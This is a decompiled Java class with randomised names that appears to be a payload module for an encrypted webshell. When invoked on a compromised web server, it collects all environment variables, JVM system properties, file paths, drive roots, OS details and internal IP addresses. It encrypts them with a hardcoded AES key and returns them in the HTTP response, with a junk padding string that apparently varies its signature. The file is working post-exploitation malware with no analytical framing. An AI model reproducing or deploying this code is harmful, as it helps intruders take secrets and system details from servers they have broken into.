/*
 * Decompiled with CFR.
 */
package org.kckx.hknjzj.ewzn;

import java.io.File;
import java.lang.Class;
import java.lang.Exception;
import java.lang.Integer;
import java.lang.Object;
import java.lang.String;
import java.lang.StringBuilder;
import java.lang.System;
import java.lang.Throwable;
import java.lang.reflect.Method;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;
import java.util.Random;
import java.util.Set;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/*
 * This class specifies class file version 49.0 but uses Java 6 signatures.  Assumed Java 6.
 */
public class Ufksbo {
    public static String whatever;
    private Object Request;
    private Object Response;
    private Object Session;

    public Ufksbo() {
        whatever = "";
        whatever = whatever + "6arxzajRIjYbkkbHHYjqDFQO5WlisbjL582HeC0PZVZ4QeoToUxOliYw8yTekY1YcMBIxNIDXgNoYwAHQAeujJd8rB9k0BHBbFwzQknGLSdXWtjKcP3Tqv4g75srM5jPVer4z6oX3Jz62MMonTvtSqGJTrlDCkEZ8BMzG2M0UzT1kAmGYY7QfbjKQ1LssLnqHvNQdzjysqgOa85BggE6jPvphk7b8DlA88HMOpEK4IRAXW7yuhmeGVLv9kSKprkW2uD4d7agc30HbxqobFiN6kebyE4zAOGdjkizWiPVzOvRpvgxOc2HvJyDC1rSxpSvtOBLxh7a9xujtyTzvnU20EXCMhh5LGzzRH90p7rfxWy5IMc59456iqq5kQ0Tg8IeJYqQa52X0JMhwxA0oVWNdy2EgLEVyIdQlG5PfD8l11O9KYh3fElEI8y0r9Bl7KKO0yMQuGEIBSAAAVHFmdevLkYs74In4XOb3W7yDfoWJ0zehALeYP28VhsgJ9pbHT7lIThvTPfJQPrT3H2CNSxSS1oRWikRFzqPXfCFuTopCB2QcTr4bErJlzkolkO8axeajSRQmXlHm1e7mmildZtj4iCCQHUEedhSy8DmtWQF20R0N9dsBF0Xvkvz54CfroUmo6ecEdS9PmfmRTbk5Twj6m7hz0W00eZb8wMm0Lc08eiVCljbsnpBrg7cDDILbmX2c6LSxXm5nu0Zv6jSzrzogiC785jNbwilvIUXLO3F7hjzghd6KZhkX7ki9hG2wi5g60pLemHY67J3ScKd3hg34kVpovx4i91jqBskeWT7kT2FDwj4dwGhtPkrhNSXz1IVBi9hilKRecRRvErKaw918KuN9PEXqN9UQ7OgNV023du2l6CPo1eWXZ0SZ5HxPxuatXtHzHtJ4j3Tv74MUNyP5I69gLNWNEdC7PZRDhId0ev7o1E4W2pg8fCQc37CPzzNXNaszGmnwtVShWl7d45x3FvAgMGfNC7WtcyEkcH3JO3x8hG49sOgQkQebUlXdkIYD1k6MhO3I7LdDB5mxobQ8FLsUXFyTKOBKqM0oYQOquvmo2ghVy9o13Wqru6xZvZqc5OWID3O0nMw5vT6QmWhn5B7mQESfGFjra6DcrZF1jt3W5RkDe2BiIqh25vgXugxyLwBIMdVXuaDjf7zRVkOJLTucYLL3FEv37MycJkFrUFdcuYezplwxAzMB5TxzUEXjov8kfAwXz3C7DTmkMvzw0HZ6nLPCJcIo0L0cqGVaVdg5x6Kx2CQ6YFh8svtLsnhhDO8QHbqMDT7rulAXDmRQcf4of4jqR6FyO2W6LfkYz5jj1sdxWSQB66EU1tbkFJ";
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public boolean equals(Object obj) {
        HashMap<String, String> result = new HashMap<String, String>();
        try {
            File[] roots;
            this.fillContext(obj);
            StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
            Map<String, String> env = System.getenv();
            for (String name : env.keySet()) {
                basicInfo.append(name + "=" + env.get(name) + "<br/>");
            }
            basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
            Properties props = System.getProperties();
            Set entrySet = props.entrySet();
            for (Map.Entry entry : entrySet) {
                basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
            }
            String currentPath = new File("").getAbsolutePath();
            String driveList = "";
            for (File f : roots = File.listRoots()) {
                driveList = driveList + f.getPath() + ";";
            }
            String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
            HashMap<String, String> entity = new HashMap<String, String>();
            entity.put("basicInfo", basicInfo.toString());
            entity.put("currentPath", currentPath);
            entity.put("driveList", driveList);
            entity.put("osInfo", osInfo);
            entity.put("arch", System.getProperty("os.arch"));
            entity.put("localIp", this.getInnerIp());
            result.put("status", "success");
            result.put("msg", this.buildJson(entity, true));
        }
        catch (Exception so) {
            try {
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so2.getClass().getMethod("write", byte[].class);
                write.invoke(so2, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                return true;
            }
            catch (Exception exception) {
                return true;
            }
        }
        catch (Throwable throwable) {
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                throw throwable;
            }
            catch (Exception exception) {
                // empty catch block
            }
            throw throwable;
        }
        try {
            Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
            Method write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
            so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
            so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            return true;
        }
        catch (Exception so) {
            return true;
        }
    }

    private String getInnerIp() {
        String ips = "";
        try {
            Enumeration<NetworkInterface> netInterfaces = NetworkInterface.getNetworkInterfaces();
            InetAddress ip = null;
            while (netInterfaces.hasMoreElements()) {
                NetworkInterface netInterface = netInterfaces.nextElement();
                Enumeration<InetAddress> addresses = netInterface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    ip = addresses.nextElement();
                    if (ip == null || !(ip instanceof Inet4Address)) continue;
                    ips = ips + ip.getHostAddress() + " ";
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        ips = ips.replace("127.0.0.1", "").trim();
        return ips;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                Object Encoder;
                Class<?> Base64;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }

    private String base64encode(byte[] data) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        try {
            this.getClass();
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{data});
        }
        catch (Throwable error) {
            this.getClass();
            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{data});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map)obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; ++i) {
            buf[i] = (byte)random.nextInt(256);
        }
        return buf;
    }

    private byte[] Encrypt(byte[] byArray) throws Exception {
        String string = "e45e329feb5d925b";
        byte[] byArray2 = string.getBytes("utf-8");
        SecretKeySpec secretKeySpec = new SecretKeySpec(byArray2, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] byArray3 = cipher.doFinal(byArray);
        try {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object object = clazz.getMethod("getEncoder", null).invoke(clazz, null);
            byArray3 = (byte[])object.getClass().getMethod("encode", byte[].class).invoke(object, new Object[]{byArray3});
        }
        catch (Throwable throwable) {
            Class<?> clazz = Class.forName("sun.misc.BASE64Encoder");
            Object obj = clazz.newInstance();
            String string2 = (String)obj.getClass().getMethod("encode", byte[].class).invoke(obj, new Object[]{byArray3});
            string2 = string2.replace("\n", "").replace("\r", "");
            byArray3 = string2.getBytes();
        }
        return byArray3;
    }
}
